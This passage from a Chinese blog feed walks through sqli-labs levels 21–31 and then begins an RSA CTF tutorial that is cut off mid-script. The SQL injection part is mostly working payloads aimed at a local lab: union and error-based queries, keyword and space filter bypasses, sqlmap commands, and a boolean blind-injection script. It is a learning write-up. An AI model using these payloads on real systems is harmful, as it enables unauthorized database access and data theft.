class="code"><pre><span class="line">&#x27;) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span><span class="comment">#</span></span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0nc2VjdXJpdHknIw==</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200628212058222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后就是爆数据的字段了，然后再爆值就行了，不多说。</p><h2 id="报错型"><a href="#报错型" class="headerlink" title="报错型"></a>报错型</h2><p>判断个数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">JykgYW5kICh1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpKSM=</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200628213357554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>其他的按照报错注入的流程来进行就可以了。</p><h1 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h1><p>这个与前一关相比就是闭合符号改变了，本关的闭合符号是双引号<code>&quot;</code><br>然后就是重复上面的操作，不再多说。<br>这个也是可以报错注入进行操作的。</p><h1 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h1><h2 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h2><p>这一关是get类型，先判断闭合符号，发现是单引号闭合。<br>这一关是过滤了注释符号，查看源码是可以看出过滤了<code>#</code>和<code>+--</code><br><img src="https://img-blog.csdnimg.cn/20200629211821534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>知识了解<br>注释符的作用：用于标记某段代码的作用，起到对代码功能的说明作用。但是注释掉的内容不会被执行。<br>MySQL中的注释符<br>1.单行注释：<code> --+或--空格 或#</code><br>2.多行注释：<code> /*多行注释内容*/</code><br>去除注释符的代码分析<br><code>preg_replace(mixed $pattern,mixed $replacement,mixed $subject) </code>   执行一个正则表达式的搜索和替换。<br>参数说明：<br>第一个参数：要搜索的模式，可以是字符串或一个字符串数组。<br>第二个参数：用于替换的字符串或字符串数组<br>第三个参数：要搜索替换的目标字符串或字符数组</p><p>那么就想办法绕过，利用注释符过滤不能成功闭合单引号，换一种思路，利用<code>or &#39;1&#39;=&#39;1</code>闭合单引号。于是有下面的payload。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;3</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200629213110369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以看到成功执行了SQL语句。<br>接下来就是爆数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="string">&#x27;3</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200629214132846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后就可以按照常规操作进行注入。</p><h2 id="使用sqlmap进行注入"><a href="#使用sqlmap进行注入" class="headerlink" title="使用sqlmap进行注入"></a>使用sqlmap进行注入</h2><p>使用sqlmap进行探测绕过去注释符的SQL注入攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;url&quot;</span> --batch</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200629213352692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>探测出id位置可能存在注入，并开始注入。时间较长。<br>已经探测出存在有注入了，其实就可以进行下一步了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-23/?id=1&quot;</span> --dbs --batch</span><br></pre></td></tr></table></figure><p>这个比较快<br><img src="https://img-blog.csdnimg.cn/20200629214739567.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后又是傻瓜式操作，为所欲为吧。</p><h1 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h1><p>根据它的提示，知道过滤了and和or。<br>mysql中大小写不敏感，大小写都一样<br>mysql对十六进制和URL编码是会自动解码的。<br>符号和关键字替换 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and==&amp;&amp;、or==||</span><br><span class="line">内联注释：<span class="comment">/*! 内联注释*/</span>会被当作SQL语句执行</span><br><span class="line">多行注释<span class="comment">/**/</span></span><br></pre></td></tr></table></figure><p>绕过策略：<br>1.大小写变形————————大小写不敏感直接被剔除。<br>2.注释绕过：例如：<code>  a/**/nd </code><br>3.双写绕过   例如：<code>oorr</code><br>4.利用符号替代绕过：如： <code>  and--&amp;&amp;    or---||</code></p><p>判断闭合符号，发现是单引号闭合。<br><img src="https://img-blog.csdnimg.cn/20200629220219794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后判断是否存在注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-25/?id=1&#x27; oorr 1=1<span class="comment">--+</span></span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-25/?id=1&#x27; Anandd 1=1<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>双写绕过成功，<br><img src="https://img-blog.csdnimg.cn/20200629221256869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-25/?id=1&#x27; || 1=1<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>符号绕过成功。目前的PHP版本可能不支持<code>&amp;&amp;</code>绕过，可以换成其他的版本试试。<br><img src="https://img-blog.csdnimg.cn/20200629221429248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>下面进行sqlmap进行注入<br>数据库名也猜解出来了。<br><img src="https://img-blog.csdnimg.cn/2020062922242877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后进行后续操作就行。</p><h1 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h1><p>在上一关的基础上加了盲注，用脚本就行了，目前脚本正在学习。还是在百度找的大佬的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">chars = <span class="string">r&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz@;\/:.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#boolean blind sql injection</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">target</span>):</span></span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-25a/?id=1 anandd (select substr(&#123;0&#125;,&#123;1&#125;,1))=&#x27;&#123;2&#125;&#x27;&quot;</span></span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        result_tmp = result</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            <span class="keyword">if</span> char == <span class="string">&#x27;\\&#x27;</span>:</span><br><span class="line">                char = <span class="string">&#x27;\\\\&#x27;</span></span><br><span class="line">            <span class="keyword">print</span> url.format(target,count,char)</span><br><span class="line">            response = requests.get(url.format(target,count,char))</span><br><span class="line">            soup = BeautifulSoup(response.text,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">            font = soup.select(<span class="string">&#x27;font[&quot;size=5&quot;]&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">print</span> font</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Your&#x27;</span> <span class="keyword">in</span> font.get_text():</span><br><span class="line">                result+=char</span><br><span class="line">                <span class="keyword">print</span> result+<span class="string">&#x27;......&#x27;</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#判断是否结束</span></span><br><span class="line">        <span class="keyword">if</span> result_tmp == result:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">u&#x27;脚本结束(结果不区分大小写)&#x27;</span></span><br><span class="line">            <span class="keyword">print</span> result</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        count = count+<span class="number">1</span></span><br></pre></td></tr></table></figure><p>还可以使用sqlmap进行探测<br><img src="https://img-blog.csdnimg.cn/20200629233053643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这里也可以看出来是时间盲注。继续探测<br><img src="https://img-blog.csdnimg.cn/20200629233216894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>数据库探测到了，继续操作就行。</p><h1 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h1><p>过滤空格和注释符。<br>空格绕过可以使用以下方法：<br>过滤空格的绕过方式<br>编码：常见的URL编码：%0a换行    %20空格        tab(水平)： %09<br><code>/**/</code><br>就将SQL语句中的空格换成<code>/**/</code>就行了，其他操作与上面一样。</p><h1 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h1><p>同样的套路，仍然是加了盲注，所以使用sqlmap或者脚本都可以做。<br>脚本就不贴了， 自行百度吧，也不能总用别人写的脚本。</p><h1 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h1><p>过滤union和select的关卡，这个绕过方式就是双写，大小写，编码绕过。<br>还有其他的过滤一起加上了<br><img src="https://img-blog.csdnimg.cn/20200629235339206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这里使用大小写加双写绕过，<br>注释符被过滤，所以先对此进行绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-27/?id=1&#x27;||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>然后爆数据库，这里是对union和select进行过滤，使用双写大小写混合可绕过，不过还有空格的绕过，这里我试了<code>/**/</code>不行，所以就用一下<code>%0A</code>进行绕过。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-27/?id=1&#x27;%0AuNiunionOn%0AseLeselectct%0A1,2,3||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>可以发现成功了。<br><img src="https://img-blog.csdnimg.cn/2020063021171623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后就可以进行爆数据库名了。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-27/?id=999&#x27;%0AuNiunionOn%0AseLeselectct%0A1,database(),3||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>这个无法使用<code>id=-1</code>因为过滤了<code>-</code>所以就用个比较大的数1000、999之类的数字都行。<br><img src="https://img-blog.csdnimg.cn/20200630212205816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>就是这样，剩下的就是为所欲为了。</p><h1 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h1><p>这一关与27关不同的只是闭合符号不一样，本关是双引号闭合</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-27a/?id=1&quot; or &quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200630220743196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>剩下的就跟27关一样了，老套路往上套就行了。</p><h1 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h1><p>这个判断闭合符号没有判断出来，于是看下源代码，<br><img src="https://img-blog.csdnimg.cn/20200630222743753.png" alt="m0re" loading="lazy"><br>看到了是<code>&#39;)</code>闭合，突然想到一个办法，就是暴力猜解<br>使用一个常见的闭合符号做的字典，然后使用burp进行暴力破解<br>果然可以，得到了几个，范围小很多了。<br><img src="https://img-blog.csdnimg.cn/20200630224700175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-28/?id=999&#x27;)%0AUnIunion%0Aselecton%0AsElEct%0A1,database(),3||(&#x27;1&#x27;)=(&#x27;1</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200630222842173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>奥，好吧，这个原来是要一个一个尝试的，根据回显正确还是错误来判断。emmm，我用sqlmap跑一下试试。</p><p>eeeee，就是太慢了，闭合符号能判断出来就行。<br>对了，再说一下这个payload。<br>%0A绕过空格就不用细说了。主要是这个<code>union select</code>,需要先构造一个<code>union select</code>给它过滤，这里用到双写。而且<code>union select</code>必须要连在一起才行。后面用<code>or&#39;1&#39;=&#39;1</code>形式来绕过注释符。</p><h1 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h1><p> 这个跟28一样，闭合符号都没有变，而且这一关没有过滤空格<br> <img src="https://img-blog.csdnimg.cn/20200630225853867.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br> 所以只需要进行注释绕过和<code>union select</code>绕过即可。</p><h1 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h1><p>eee,原本没看懂什么意思，这个是直接可以注入的，</p><p><img src="https://img-blog.csdnimg.cn/20200630231040765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>直接得到数据库名了。<br>而且我用sqlmap跑了一遍，也没有问题。<br><img src="https://img-blog.csdnimg.cn/20200630230857312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>所以我有点迷，这一关是要干什么？<br>然后查了一下网上大师傅的博客，看到好多个不同的，然后找到一个比较好的博客，这里先贴出来🔑<a href="https://www.jianshu.com/p/46cb6c354de5">sql-labs/Less-29</a><br>这位师傅的博客写的非常详细，学习了。<br>就是问题是<br><img src="https://img-blog.csdnimg.cn/2020071214593214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>我的为什么没有跳转到<code>hacked.jsp</code><br>可能是我的靶场哪里出了问题。不过还是了解了tomcat服务器，还有注入时遇到双服务器。</p><h1 id="Less-30-31"><a href="#Less-30-31" class="headerlink" title="Less-30-31"></a>Less-30-31</h1><p>然后的话，30和31和这一关没什么太大区别，都是老套路。就不总结了。</p><p>下周继续努力。</p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA密码的学习及常见CTF题型总结</title>
      <link href="/2020/08/23/RSA%E5%AF%86%E7%A0%81%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81CTF%E9%A2%98%E5%9E%8B%E7%9A%84%E6%80%BB%E7%BB%93(%E6%94%B6%E9%9B%86RSA%E8%A7%A3%E9%A2%98%E8%84%9A%E6%9C%AC)/"/>
      <url>/2020/08/23/RSA%E5%AF%86%E7%A0%81%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81CTF%E9%A2%98%E5%9E%8B%E7%9A%84%E6%80%BB%E7%BB%93(%E6%94%B6%E9%9B%86RSA%E8%A7%A3%E9%A2%98%E8%84%9A%E6%9C%AC)/</url>
      
        <content type="html"><![CDATA[<h1 id="放在最前面"><a href="#放在最前面" class="headerlink" title="放在最前面"></a>放在最前面</h1><p> 大师傅博客<br><a href="https://www.freebuf.com/column/148185.html">从数盲到口算 ——带你玩转RSA加密算法（一）</a><br><a href="https://www.freebuf.com/column/148898.html">你想要的RSA解题技巧（二）</a><br>前言：gmpy2库终于安装好了，那就能开心的玩耍了。<br>一个平台一个平台的“扫荡”<br>RSA这类题真是每次看见都着急，学脚本吧？但是又没有gmpy2。无奈，现在终于有了，我要把之前每写出来的题扫一遍。<br>关于RSA的这个密码。数学逻辑比较……那啥一点，跟着B站上的一个up主学的，讲的挺好，听着听着睡着了。让我找到了高中的感觉。跑题了，，咳咳。当然还有师傅们的博客提供学习帮助。</p><h1 id="RSA密码原理"><a href="#RSA密码原理" class="headerlink" title="RSA密码原理"></a>RSA密码原理</h1><p><img src="https://img-blog.csdnimg.cn/20200421180651267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自漏斗社区" loading="lazy"><br>数学知识：<br>首先：取模运算知识，就是取余数。可以使用python的pow函数来解<br>pow的解法如下：</p><p><img src="https://img-blog.csdnimg.cn/20200422160841868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>其次：同余运算。两个整数a,b，它们除以整数M所得的余数相等：a ≡ b(mod m)，比如说5除3余数为2，11除3余数也为2，于是可写成11 ≡ 5(mod 3)。<br>RSA加密算法：<br>一个原理图，从漏斗社区借鉴的<br><img src="https://img-blog.csdnimg.cn/20200422163149234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自漏斗社区" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200422163252185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自漏斗社区" loading="lazy"><br>这两张图对于理解rsa加密很有帮助，我从这两张图中理解后思路变的更清晰了。<br>还有一张解析CTF中的rsa基础题型的图。声明：是漏斗社区的师傅写的，我只是搬过来做个笔记，方便以后查询使用。<br><img src="https://img-blog.csdnimg.cn/2020042216384716.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自漏斗社区" loading="lazy"><br>做几个类型的题目记录一下，防止以后忘记方便复习。</p><h1 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h1><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p><img src="https://img-blog.csdnimg.cn/20200402213426241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这道题是一种类型，已知p,q,e，求d<br>可以用求d的脚本直接解出，运行脚本需要用到gmpy2第三方库。<br>直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!------Augenstern------!</span></span><br><span class="line"><span class="comment">#!lalalalalala------lalalalalalalalala!</span></span><br><span class="line"><span class="comment">#!***********lxj python***********!</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line">p = <span class="number">473398607161</span></span><br><span class="line">q = <span class="number">4511491</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">d = gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line"><span class="keyword">print</span> (d)</span><br></pre></td></tr></table></figure><p>flag{125631357777427553}</p><h2 id="rsarsa"><a href="#rsarsa" class="headerlink" title="rsarsa"></a>rsarsa</h2><p><img src="https://img-blog.csdnimg.cn/20200414225459263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>脚本关。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span>(<span class="params">c,e,p,q</span>):</span></span><br><span class="line">L=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d=gmpy2.invert(e,L)</span><br><span class="line">n=p*q</span><br><span class="line">m=gmpy2.powmod(c,d,n)</span><br><span class="line">flag=str(m)</span><br><span class="line">print(<span class="string">&quot;flag&#123;&quot;</span>+flag+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">p =  <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q =  <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e =  <span class="number">65537</span></span><br><span class="line">c =  <span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line">Decrypt(c,e,p,q)</span><br></pre></td></tr></table></figure><p>注释：<br><code>__name__==&#39;__main__&#39;</code>一个python文件通常有两种使用方法，<br>第一是作为脚本直接执行，<br>第二是 import 到其他的 python 脚本中被调用（模块重用）执行。因此 <code>if __name__ == &#39;main&#39;:</code> 的作用就是控制这两种情况执行代码的过程，在 <code>if __name__ == &#39;main&#39;:</code> 下的代码只有在第一种情况下（即文件作为脚本直接执行）才会被执行，而 import 到其他脚本中是不会被执行的，忘了就再看看大佬的博客<a href="https://blog.csdn.net/heqiang525/article/details/89879056">大佬博客</a><br>flag其他没什么了。flag直接得到。</p><h2 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h2><p><img src="https://img-blog.csdnimg.cn/20200418140303202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>其实通过这道题我学到很多，一点一点看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dp=d%(p<span class="number">-1</span>)</span><br><span class="line">dq=d%(q<span class="number">-1</span>)</span><br></pre></td></tr></table></figure><p>这个脚本不会写，我只会写那种异常的简单的小脚本，这种不会写。本人脸皮厚当个script boy。😪😪</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">dp,dq,p,q,c</span>):</span></span><br><span class="line">    InvQ = gmpy2.invert(q, p)</span><br><span class="line">    mp = pow(c, dp, p)</span><br><span class="line">    mq = pow(c, dq, q)</span><br><span class="line">    m = (((mp-mq)*InvQ) % p)*q+mq</span><br><span class="line">    <span class="keyword">print</span> (libnum.n2s(m))</span><br><span class="line"></span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span> </span><br><span class="line">q = <span 